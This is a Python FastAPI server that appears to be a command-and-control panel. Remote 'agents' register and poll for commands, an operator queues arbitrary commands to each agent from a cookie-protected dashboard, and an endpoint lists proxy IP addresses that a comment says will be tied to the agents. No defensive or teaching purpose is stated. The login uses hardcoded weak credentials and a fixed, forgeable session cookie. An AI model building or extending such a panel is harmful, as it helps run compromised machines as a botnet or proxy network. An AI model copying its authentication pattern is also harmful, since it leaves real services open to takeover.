from fastapi import FastAPI, Request, Form, status
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from typing import Dict, List
from datetime import datetime

app = FastAPI()

# ======================
# Templates
# ======================
templates = Jinja2Templates(directory="templates")

# ======================
# Auth Config
# ======================
ADMIN_USER = "admin"
ADMIN_PASS = "123456"

def is_logged_in(request: Request) -> bool:
    return request.cookies.get("session") == "active"

# ======================
# In-Memory Storage
# ======================
agents: Dict[str, dict] = {}
commands: Dict[str, str] = {}

# مثال Proxies (لاحقًا تُربط بالـ Agents)
proxies: List[dict] = [
    {
        "ip": "83.99.97.77",
        "port": 5025,
        "type": "HTTPS",
        "country": "DZ",
        "latency": "190 ms",
        "status": "online"
    },
    {
        "ip": "207.99.178.250",
        "port": 4195,
        "type": "HTTP",
        "country": "DZ",
        "latency": "45 ms",
        "status": "online"
    },
    {
        "ip": "69.171.122.204",
        "port": 2008,
        "type": "HTTP",
        "country": "DZ",
        "latency": "76 ms",
        "status": "offline"
    },
]

# ======================
# Dashboard
# ======================
@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    if not is_logged_in(request):
        return templates.TemplateResponse(
            "login.html",
            {"request": request}
        )

    return templates.TemplateResponse(
        "index.html",
        {
            "request": request,
            "agents": agents
        }
    )

# ======================
# Login / Logout
# ======================
@app.post("/login")
async def login(
    username: str = Form(...),
    password: str = Form(...)
):
    if username == ADMIN_USER and password == ADMIN_PASS:
        resp = RedirectResponse(
            url="/",
            status_code=status.HTTP_303_SEE_OTHER
        )
        resp.set_cookie(
            key="session",
            value="active",
            httponly=True
        )
        return resp

    return HTMLResponse("Access Denied", status_code=401)

@app.get("/logout")
async def logout():
    resp = RedirectResponse(url="/")
    resp.delete_cookie("session")
    return resp

# ======================
# Agent API
# ======================
@app.post("/register")
async def register_agent(data: dict):
    agent_id = data.get("agent_id")
    if not agent_id:
        return JSONResponse(
            {"error": "agent_id required"},
            status_code=400
        )

    data["last_seen"] = datetime.now().strftime("%H:%M:%S")
    data["status"] = "online"
    agents[agent_id] = data

    return {"status": "registered"}

@app.post("/poll")
async def poll_agent(data: dict):
    agent_id = data.get("agent_id")
    if not agent_id:
        return {"error": "agent_id required"}

    if agent_id in agents:
        agents[agent_id]["last_seen"] = datetime.now().strftime("%H:%M:%S")

    cmd = commands.pop(agent_id, None)
    return {"command": cmd} if cmd else {"status": "idle"}

@app.post("/send_command")
async def send_command(
    request: Request,
    agent_id: str = Form(...),
    command: str = Form(...)
):
    if not is_logged_in(request):
        return RedirectResponse("/", status_code=303)

    commands[agent_id] = command
    return RedirectResponse("/", status_code=303)

# ======================
# Proxies API (for UI)
# ======================
@app.get("/api/proxies")
async def get_proxies():
    return {
        "total": len(proxies),
        "shown": len(proxies),
        "refresh": 5,
        "proxies": proxies
    }
